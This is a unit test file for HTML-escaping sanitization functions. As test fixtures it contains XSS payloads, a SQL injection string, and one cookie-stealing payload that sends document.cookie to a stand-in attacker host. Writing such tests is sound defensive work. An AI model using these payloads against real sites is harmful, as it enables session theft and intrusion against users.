import { sanitizeString, sanitizeObject } from './validationMiddleware.js';

/**
 * Unit Tests for Input Sanitization
 * 
 * Tests the sanitization functions that prevent XSS and injection attacks
 * Requirements: 4.1, 4.2
 */

describe('Input Sanitization - XSS Prevention', () => {
  describe('sanitizeString', () => {
    it('should escape HTML special characters', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizeString(input);
      
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
    });

    it('should escape ampersands', () => {
      const input = 'Tom & Jerry';
      const result = sanitizeString(input);
      
      expect(result).toContain('&amp;');
    });

    it('should escape double quotes', () => {
      const input = 'He said "Hello"';
      const result = sanitizeString(input);
      
      expect(result).toContain('&quot;');
    });

    it('should escape single quotes', () => {
      const input = "It's a test";
      const result = sanitizeString(input);
      
      expect(result).toContain('&#x27;');
    });

    it('should escape forward slashes', () => {
      const input = '/api/v1/users/profile';
      const result = sanitizeString(input);
      
      expect(result).toContain('&#x2F;');
    });

    it('should escape greater than and less than signs', () => {
      const input = '<img src=x onerror="alert(\'XSS\')">';
      const result = sanitizeString(input);
      
      expect(result).toContain('&lt;img');
      expect(result).toContain('&gt;');
    });

    it('should trim leading and trailing whitespace', () => {
      const input = '  Hello World  ';
      const result = sanitizeString(input);
      
      expect(result).toBe('Hello World');
    });

    it('should handle empty strings', () => {
      const input = '';
      const result = sanitizeString(input);
      
      expect(result).toBe('');
    });

    it('should handle strings with only whitespace', () => {
      const input = '   ';
      const result = sanitizeString(input);
      
      expect(result).toBe('');
    });

    it('should handle non-string inputs gracefully', () => {
      const input = 123 as any;
      const result = sanitizeString(input);
      
      expect(result).toBe(123);
    });

    it('should handle SQL injection attempts', () => {
      const input = "'; DROP TABLE users; --";
      const result = sanitizeString(input);
      
      // The string should be escaped, not executed
      expect(result).toContain('&#x27;');
    });

    it('should handle multiple special characters', () => {
      const input = '<script>alert("XSS & Injection")</script>';
      const result = sanitizeString(input);
      
      expect(result).toContain('&lt;script&gt;');
      expect(result).toContain('&quot;');
      expect(result).toContain('&amp;');
    });
  });

  describe('sanitizeObject', () => {
    it('should sanitize string values in objects', () => {
      const input = {
        title: '<script>alert("XSS")</script>',
        content: 'Normal content',
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.title).toContain('&lt;script&gt;');
      expect(result.content).toBe('Normal content');
    });

    it('should sanitize nested objects', () => {
      const input = {
        user: {
          name: '<img src=x onerror="alert(\'XSS\')">'
        }
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.user.name).toContain('&lt;img');
    });

    it('should sanitize arrays of strings', () => {
      const input = {
        tags: ['<script>alert("XSS")</script>', 'normal-tag']
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.tags[0]).toContain('&lt;script&gt;');
      expect(result.tags[1]).toBe('normal-tag');
    });

    it('should handle null values', () => {
      const input = {
        value: null
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.value).toBeNull();
    });

    it('should handle undefined values', () => {
      const input = {
        value: undefined
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.value).toBeUndefined();
    });

    it('should handle numeric values', () => {
      const input = {
        count: 42,
        price: 19.99
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.count).toBe(42);
      expect(result.price).toBe(19.99);
    });

    it('should handle boolean values', () => {
      const input = {
        active: true,
        deleted: false
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.active).toBe(true);
      expect(result.deleted).toBe(false);
    });

    it('should handle deeply nested structures', () => {
      const input = {
        level1: {
          level2: {
            level3: {
              value: '<script>alert("XSS")</script>'
            }
          }
        }
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.level1.level2.level3.value).toContain('&lt;script&gt;');
    });

    it('should handle arrays of objects', () => {
      const input = {
        items: [
          { name: '<script>alert("XSS")</script>' },
          { name: 'normal-item' }
        ]
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.items[0].name).toContain('&lt;script&gt;');
      expect(result.items[1].name).toBe('normal-item');
    });

    it('should handle mixed types in arrays', () => {
      const input = {
        mixed: [
          '<script>alert("XSS")</script>',
          42,
          true,
          null,
          { nested: '<img src=x>' }
        ]
      };
      const result = sanitizeObject(input) as any;
      
      expect(result.mixed[0]).toContain('&lt;script&gt;');
      expect(result.mixed[1]).toBe(42);
      expect(result.mixed[2]).toBe(true);
      expect(result.mixed[3]).toBeNull();
      expect(result.mixed[4].nested).toContain('&lt;img');
    });

    it('should handle null input', () => {
      const input = null;
      const result = sanitizeObject(input);
      
      expect(result).toBeNull();
    });

    it('should handle undefined input', () => {
      const input = undefined;
      const result = sanitizeObject(input);
      
      expect(result).toBeUndefined();
    });

    it('should handle string input directly', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizeObject(input);
      
      expect(result).toContain('&lt;script&gt;');
    });

    it('should handle numeric input directly', () => {
      const input = 42;
      const result = sanitizeObject(input);
      
      expect(result).toBe(42);
    });
  });

  describe('Real-world XSS Attack Scenarios', () => {
    it('should prevent stored XSS in journal entry title', () => {
      const maliciousTitle = '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
      const result = sanitizeString(maliciousTitle);
      
      // The HTML tags and quotes should be escaped, preventing execution
      expect(result).toContain('&lt;img');
      expect(result).toContain('&quot;');
      expect(result).not.toContain('<img');
    });

    it('should prevent DOM-based XSS in entry content', () => {
      const maliciousContent = '<svg onload="alert(\'XSS\')">';
      const result = sanitizeString(maliciousContent);
      
      // The HTML tags and quotes should be escaped
      expect(result).toContain('&lt;svg');
      expect(result).toContain('&quot;');
      expect(result).not.toContain('<svg');
    });

    it('should prevent event handler XSS', () => {
      const maliciousInput = '<div onclick="alert(\'XSS\')">Click me</div>';
      const result = sanitizeString(maliciousInput);
      
      // The HTML tags and quotes should be escaped
      expect(result).toContain('&lt;div');
      expect(result).toContain('&quot;');
      expect(result).not.toContain('<div');
    });

    it('should prevent JavaScript protocol XSS', () => {
      const maliciousInput = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const result = sanitizeString(maliciousInput);
      
      // The HTML tags and quotes should be escaped
      expect(result).toContain('&lt;a');
      expect(result).toContain('&quot;');
      expect(result).not.toContain('<a');
    });

    it('should prevent data URI XSS', () => {
      const maliciousInput = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const result = sanitizeString(maliciousInput);
      
      expect(result).toContain('&lt;img');
      expect(result).toContain('&lt;script&gt;');
    });
  });
});
